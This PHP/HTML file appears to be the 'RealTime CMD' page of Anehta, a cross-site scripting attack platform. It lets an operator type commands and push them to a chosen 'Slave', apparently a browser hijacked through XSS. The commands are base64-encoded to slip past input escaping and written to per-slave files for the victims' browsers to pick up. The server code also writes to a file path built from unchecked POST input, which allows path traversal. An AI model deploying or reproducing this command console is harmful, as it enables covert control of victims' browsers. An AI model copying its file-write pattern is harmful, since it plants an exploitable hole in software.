<?php
  //加载auth类
  include_once("class/auth_Class.php");

  header("Content-Type: text/html; charset=utf-8");
  
  checkLoginStatus($U, $P, $textKey);
?>
<html>
<head>
		<title>
			Anehta!
		</title>
	  <script src="../library/anehta.js" ></script>
	  <script src="../library/jQuery.js" ></script>
	  <script src="../server/js/effects.core.js"></script>
	  <script src="../server/js/ui.core.js"></script>
	  <script src="../server/js/effects.bounce.js"></script>
	  <script src="../server/js/effects.slide.js"></script>
	  <script src="../server/js/effects.shake.js"></script>
	  <!-- script src="../server/js/effects.explode.js"></script -->
	  <script src="../server/js/effects.clip.js"></script>
	  <script src="../server/js/ui.accordion.js"></script>
	  <script src="../server/js/ui.draggable.js"></script>
	  <script src="../server/js/ui.dialog.js"></script>
	  <script src="../server/js/ui.resizable.js"></script>	  
	  
	  <!-- 加载 JSONER -->
	  <script src="../server/js/_compressed_jsoner.commons.js"></script>
    <script src="../server/js/_compressed_jsoner.js"></script>
    <script src="../server/js/_compressed_jsoner.serializer.js"></script>
    <script src="../server/js/jsoner.undomanager.js"></script>
    <script src="../server/js/jsoner.updater.js"></script>	  
	  
	  <script src="../server/js/loadData.js"></script>
	  <link rel="stylesheet" type="text/css" href="css/style.css" />

</head>
<body onload="return initData();">


<img id="logo" style="float:top;z-index: 19999" src="../server/img/logo.jpg" />	
<ul id="basictab" class="basictab">	
<li style="margin: 0 0 0 188px;"><a href="../server/admin.php">Home</a></li>
<li><a href="../server/slavemonitor.php">Slave Monitor</a></li>
<li class="selected"><a href="../server/rtcmd.php">RealTime CMD</a></li>
<li><a href="../server/clientproxy.php">Client Proxy</a></li>
<li><a href="../server/onlineproxy.php">Online Proxy</a></li>
<li><a href="../server/config.php">Configure</a></li>
<li><a href="../server/help.php">Help</a></li>
<a href="../server/logout.php">Logout</a>
</ul>


<div id="xssSites" class="wireframemenu" style="float:left;" >
<ul>
<!--
<li onMouseover="dropdownmenu(this, event, menu2, '150px')" onMouseout="delayhidemenu()" ><a href="">Anehta</a></li>
<li><a href="">Anehta</a></li>
<li><a href="">Anehta</a></li>
-->
</ul>
<a href="../server/rss.xml"><img style="float:top;" border="0" src="../server/img/rss.png" ></img>&nbsp;订阅Slave RSS</a>
<a href="javascript:dumpToMail();" ><img style="width= 1px; height= 1px;" border="0" src="../server/img/mail.gif" ></img>&nbsp;Dump to Mail</a>
</div>


<script>

// 每个页面的 dosomething可能不同
function dosomething(o){
	var slaveid = o.innerHTML;
	// 复制 slaveWatermark到 input框
	$d.getElementById("slave").value = "Slave_"+slaveid;
}
	
</script>


<!-- 以下是自定义部分 -->

<div id="shiftcontainer" class="shiftcontainer" style="margin: 0 0 0 15px; float: left;">
  <div class="shadowcontainer" style="width: 700px; ">
    <div class="innerdiv" style="height:350px;">
      <label for="cmd" style="font-size: 12px; font-family: verdana; font-weight: bold; color: grey;">Real Time Command</label> <br />
      <textarea id="cmd" name="cmd" style="border: 1px solid #ccc; padding: 0; margin: 0 0 0 15px; float: left; width: 655px; height: 250px;" ></textarea><br />
      <br />
        <div style="margin: 0 0 0 15px; float: left;">
        	<br />
	        <label for="slave" style="font-size: 12px; font-family: verdana; font-weight: bold; color: grey;">Select Slave</label>
	        <input type=text id="slave" name="slave" value="" />
          <input type="button" class="formbutton2"  value="FVCK!" onclick="return sendCmd();"/>
        </div>
    </div>
  </div>
</div>
			
<script>
  function sendCmd(){
  	var c = document.getElementsByTagName('textarea')[0].value;
  	var sl = document.getElementById("slave").value;
  	// base64 encode cmd to bypass magic_quotes on
  	c = anehta.crypto.base64Encode(c);
  	
  	// 发送cmd到server
  	if (anehtaXmlHttp.init()) {
  	  anehta.ajax.post("../server/rtcmd.php", "slave="+sl+"&cmd="+c);
    }
    
    //重置textarea
    setTimeout(function(){document.getElementsByTagName('textarea')[0].value = "";},500);
  }	
</script>



<?php
// 实时命令

if (!empty($_POST["cmd"])){
  $realtime_cmd = base64_decode($_POST["cmd"]);
  $slavewatermark = $_POST["slave"]; 
  
  $fp = fopen("../slave/".$slavewatermark."_rtcmd.txt", "w+");

  fwrite($fp, urldecode($realtime_cmd));

  fclose($fp);
}

?>

<div align="center">	
	 <!--footer-->
  <div class="clear">
    <div class="line2">
    </div>
    <div class="clear">
      <label for="foot" style="color: #666666; font-size: 14px;">&copy;2008 <a href="http://anehta.googlecode.com">Anehta</a></label>
    </div>
  </div>
</div>

</body>
</html>